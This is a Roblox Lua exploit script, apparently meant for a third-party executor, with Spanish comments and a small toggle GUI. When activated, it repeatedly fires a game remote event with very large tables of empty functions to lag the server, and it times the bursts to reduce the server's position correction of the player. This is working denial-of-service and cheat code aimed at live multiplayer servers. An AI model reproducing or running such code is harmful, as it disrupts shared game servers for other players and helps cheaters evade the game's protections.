--[[
	KYRON - ACTIVATE v6
	Más fuerte + menos teletransporte de vuelta (menos rubberband)
]]

local Players           = game:GetService("Players")
local TweenService      = game:GetService("TweenService")
local UserInputService  = game:GetService("UserInputService")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Limpiar
pcall(function()
	local old = playerGui:FindFirstChild("KYRON_ACTIVATE")
	if old then old:Destroy() end
	if gethui then
		local h = gethui()
		local o = h:FindFirstChild("KYRON_ACTIVATE")
		if o then o:Destroy() end
	end
end)

--------------------------------------------------------------------------
-- Config
--------------------------------------------------------------------------
local FILE = "kyron_activate.json"
local cfg = {
	Locked = false,
	CardPos = nil,
	Intensity = 14000,
	IntensityV2 = 22000,
}

pcall(function()
	if isfile and isfile(FILE) then
		local data = HttpService:JSONDecode(readfile(FILE))
		for k in pairs(cfg) do
			if data[k] ~= nil then cfg[k] = data[k] end
		end
	end
end)

local saveToken = 0
local function save()
	saveToken += 1
	local token = saveToken
	task.delay(0.3, function()
		if token ~= saveToken then return end
		pcall(function()
			if writefile then
				writefile(FILE, HttpService:JSONEncode(cfg))
			end
		end)
	end)
end

local function packPos(p)
	return { p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset }
end

local function unpackPos(t, fallback)
	if type(t) == "table" and #t == 4 then
		return UDim2.new(t[1], t[2], t[3], t[4])
	end
	return fallback
end

--------------------------------------------------------------------------
-- Theme
--------------------------------------------------------------------------
local C = {
	Bg      = Color3.fromRGB(12, 13, 16),
	Raise   = Color3.fromRGB(20, 22, 26),
	Line    = Color3.fromRGB(42, 45, 52),
	Dim     = Color3.fromRGB(100, 105, 115),
	Text    = Color3.fromRGB(230, 233, 240),
	White   = Color3.fromRGB(255, 255, 255),
	Gray    = Color3.fromRGB(48, 52, 60),
	Accent  = Color3.fromRGB(190, 200, 215),
	Glow    = Color3.fromRGB(160, 175, 200),
}

local FONT_K = Enum.Font.GothamBold

local function new(class, props, kids)
	local o = Instance.new(class)
	for k, v in pairs(props or {}) do o[k] = v end
	for _, c in ipairs(kids or {}) do c.Parent = o end
	return o
end

local function tween(o, t, props, style, dir)
	return TweenService:Create(o, TweenInfo.new(t, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out), props)
end

local function corner(r)
	return new("UICorner", { CornerRadius = UDim.new(0, r) })
end

local function stroke(col, tr, th)
	return new("UIStroke", {
		Color = col,
		Transparency = tr or 0,
		Thickness = th or 1,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	})
end

--------------------------------------------------------------------------
-- Event
--------------------------------------------------------------------------
local Event
do
	local ok, net = pcall(function()
		local pkgs = ReplicatedStorage:WaitForChild("Packages", 4)
		return pkgs and pkgs:WaitForChild("Net", 4)
	end)
	if ok and net then
		Event = net:GetChildren()[6]
	end
end

--------------------------------------------------------------------------
-- Lag Functions v6 - Más fuerte + menos teletransporte de vuelta
--------------------------------------------------------------------------
local active = false
local lagging = false
local lagThread = nil
local payloadV1, payloadV2 = nil, nil

local function buildPayload(size)
	local t = table.create(size)
	for i = 1, size do
		t[i] = function() end
	end
	return t
end

local function startLagging()
	if lagging or not Event then return end
	lagging = true

	local intensity1 = math.clamp(math.floor(tonumber(cfg.Intensity) or 14000), 1, 200000)
	local intensity2 = math.clamp(math.floor(tonumber(cfg.IntensityV2) or 22000), 1000, 900000)

	if not payloadV1 or #payloadV1 ~= intensity1 then
		payloadV1 = buildPayload(intensity1)
	end
	if not payloadV2 or #payloadV2 ~= intensity2 then
		payloadV2 = buildPayload(intensity2)
	end

	lagThread = task.spawn(function()
		local cycle = 0
		while lagging do
			cycle += 1

			-- === BURST FUERTE ===
			pcall(function()
				-- Golpe principal (V1 + V2)
				Event:FireServer(payloadV1)
				Event:FireServer(payloadV2)
				Event:FireServer(payloadV1)
				Event:FireServer(payloadV2)
				Event:FireServer(payloadV1)

				-- Extra V2 más pesado
				Event:FireServer(payloadV2)
				Event:FireServer(payloadV2)

				-- Cada 3 ciclos un golpe todavía más fuerte
				if cycle % 3 == 0 then
					Event:FireServer(payloadV1)
					Event:FireServer(payloadV2)
					Event:FireServer(payloadV1)
					Event:FireServer(payloadV2)
				end
			end)

			-- === TIMING ANTI-RUBBERBAND ===
			-- Burst corto + pausa suficiente para que el servidor
			-- no te corrija tan fuerte la posición
			if cycle % 4 == 0 then
				task.wait(0.045) -- pausa de recuperación
			else
				task.wait(0.016)
			end
		end
	end)
end

local function stopLagging()
	if not lagging then return end
	lagging = false
	if lagThread then
		pcall(task.cancel, lagThread)
		lagThread = nil
	end
end

local function setActivate(v)
	v = not not v
	if v == active then return end
	active = v
	if v then
		startLagging()
	else
		stopLagging()
	end
end

--------------------------------------------------------------------------
-- GUI
--------------------------------------------------------------------------
local gui = new("ScreenGui", {
	Name = "KYRON_ACTIVATE",
	ResetOnSpawn = false,
	IgnoreGuiInset = true,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	DisplayOrder = 999,
})

pcall(function()
	if gethui then gui.Parent = gethui() end
end)
if not gui.Parent then
	gui.Parent = playerGui
end

local W, H = 186, 74
local locked = cfg.Locked or false

local card = new("Frame", {
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = unpackPos(cfg.CardPos, UDim2.fromScale(0.5, 0.5)),
	Size = UDim2.fromOffset(W, H),
	BackgroundColor3 = C.Bg,
	BackgroundTransparency = 0.04,
	BorderSizePixel = 0,
	ClipsDescendants = true,
	Parent = gui,
}, { corner(14) })

local cardStroke = stroke(C.Line, 0.4, 1.25)
cardStroke.Parent = card

new("Frame", {
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.53),
	Size = UDim2.new(1, 10, 1, 12),
	BackgroundColor3 = Color3.new(0, 0, 0),
	BackgroundTransparency = 0.8,
	BorderSizePixel = 0,
	ZIndex = 0,
	Parent = card,
}, { corner(16) })

local cardScale = new("UIScale", { Scale = 0.88, Parent = card })
tween(cardScale, 0.32, { Scale = 1 }, Enum.EasingStyle.Back):Play()

--------------------------------------------------------------------------
-- Título
--------------------------------------------------------------------------
new("TextLabel", {
	Text = "KYRON",
	Font = FONT_K,
	TextSize = 11,
	TextColor3 = C.White,
	BackgroundTransparency = 1,
	Position = UDim2.fromOffset(12, 7),
	Size = UDim2.fromOffset(70, 18),
	TextXAlignment = Enum.TextXAlignment.Left,
	Parent = card,
})

--------------------------------------------------------------------------
-- Candado
--------------------------------------------------------------------------
local lockBtn = new("TextButton", {
	AnchorPoint = Vector2.new(1, 0),
	Position = UDim2.new(1, -8, 0, 6),
	Size = UDim2.fromOffset(24, 24),
	BackgroundColor3 = C.Raise,
	AutoButtonColor = false,
	Font = FONT_K,
	TextSize = 13,
	TextColor3 = C.Dim,
	Text = locked and "🔒" or "🔓",
	ZIndex = 12,
	Parent = card,
}, { corner(7) })

local lockStroke = stroke(C.Line, 0.4, 1)
lockStroke.Parent = lockBtn

local lockScale = new("UIScale", { Parent = lockBtn })

local function updateLockVisual()
	local icon = locked and "🔒" or "🔓"
	local col = locked and C.Accent or C.Dim
	lockBtn.Text = icon
	tween(lockBtn, 0.18, { TextColor3 = col }):Play()
	tween(lockStroke, 0.18, { Color = locked and C.Accent or C.Line }):Play()
end

local function toggleLock()
	locked = not locked
	cfg.Locked = locked
	save()
	updateLockVisual()
	lockScale.Scale = 0.8
	tween(lockScale, 0.25, { Scale = 1 }, Enum.EasingStyle.Back):Play()
end

lockBtn.MouseButton1Click:Connect(toggleLock)
lockBtn.MouseEnter:Connect(function()
	tween(lockBtn, 0.12, { BackgroundColor3 = C.Line }):Play()
end)
lockBtn.MouseLeave:Connect(function()
	tween(lockBtn, 0.18, { BackgroundColor3 = C.Raise }):Play()
end)
updateLockVisual()

--------------------------------------------------------------------------
-- Botón ACTIVATE
--------------------------------------------------------------------------
local activateBtn = new("TextButton", {
	Position = UDim2.fromOffset(10, 34),
	Size = UDim2.fromOffset(W - 20, 32),
	BackgroundColor3 = C.Raise,
	AutoButtonColor = false,
	Font = FONT_K,
	TextSize = 13,
	TextColor3 = C.White,
	Text = "ACTIVATE",
	ZIndex = 6,
	Parent = card,
}, { corner(9) })

local activateStroke = stroke(C.Line, 0.3, 1.2)
activateStroke.Parent = activateBtn

local activateScale = new("UIScale", { Parent = activateBtn })

local glow = new("Frame", {
	AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5),
	Size = UDim2.fromScale(0, 1),
	BackgroundColor3 = C.Glow,
	BackgroundTransparency = 0.88,
	BorderSizePixel = 0,
	ZIndex = 1,
	Parent = activateBtn,
}, { corner(9) })

local function paintActivate()
	if active then
		activateBtn.Text = "ACTIVATE  ON"
		tween(activateBtn, 0.22, { BackgroundColor3 = C.Gray }):Play()
		tween(activateStroke, 0.22, { Color = C.Accent }):Play()
		tween(glow, 0.3, { Size = UDim2.fromScale(1, 1) }):Play()
	else
		activateBtn.Text = "ACTIVATE"
		tween(activateBtn, 0.22, { BackgroundColor3 = C.Raise }):Play()
		tween(activateStroke, 0.22, { Color = C.Line }):Play()
		tween(glow, 0.25, { Size = UDim2.fromScale(0, 1) }):Play()
	end
end

activateBtn.MouseButton1Click:Connect(function()
	setActivate(not active)
	paintActivate()
	activateScale.Scale = 0.93
	tween(activateScale, 0.28, { Scale = 1 }, Enum.EasingStyle.Back):Play()
end)

activateBtn.MouseButton1Down:Connect(function()
	tween(activateScale, 0.07, { Scale = 0.94 }):Play()
end)

activateBtn.MouseButton1Up:Connect(function()
	tween(activateScale, 0.2, { Scale = 1 }, Enum.EasingStyle.Back):Play()
end)

activateBtn.MouseEnter:Connect(function()
	if not active then
		tween(activateBtn, 0.15, { BackgroundColor3 = Color3.fromRGB(28, 30, 36) }):Play()
		tween(activateStroke, 0.15, { Color = C.Dim }):Play()
	end
end)

activateBtn.MouseLeave:Connect(function()
	if not active then
		tween(activateBtn, 0.2, { BackgroundColor3 = C.Raise }):Play()
		tween(activateStroke, 0.2, { Color = C.Line }):Play()
	end
end)

paintActivate()

--------------------------------------------------------------------------
-- Drag + Guardar posición
--------------------------------------------------------------------------
do
	local dragging = false
	local startPos, startInput

	local handle = new("TextButton", {
		Position = UDim2.fromOffset(0, 0),
		Size = UDim2.new(1, -34, 0, 32),
		BackgroundTransparency = 1,
		Text = "",
		ZIndex = 5,
		Parent = card,
	})

	handle.InputBegan:Connect(function(input)
		if locked then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			startPos = card.Position
			startInput = input.Position
			tween(cardStroke, 0.12, { Color = C.Accent, Transparency = 0.25 }):Play()
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if not dragging or locked then return end
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			local delta = input.Position - startInput
			card.Position = UDim2.new(
				startPos.X.Scale, startPos.X.Offset + delta.X,
				startPos.Y.Scale, startPos.Y.Offset + delta.Y
			)
		end
	end)

	UserInputService.InputEnded:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
			dragging = false
			cfg.CardPos = packPos(card.Position)
			save()
			tween(cardStroke, 0.25, { Color = C.Line, Transparency = 0.4 }):Play()
		end
	end)
end

--------------------------------------------------------------------------
-- Pulse
--------------------------------------------------------------------------
task.spawn(function()
	while card and card.Parent do
		if active then
			tween(activateStroke, 0.85, { Transparency = 0.5 }):Play()
			task.wait(0.85)
			if active then
				tween(activateStroke, 0.85, { Transparency = 0.18 }):Play()
			end
			task.wait(0.85)
		else
			task.wait(0.6)
		end
	end
end)

print("[KYRON] ACTIVATE v6 listo — más fuerte, menos teletransporte")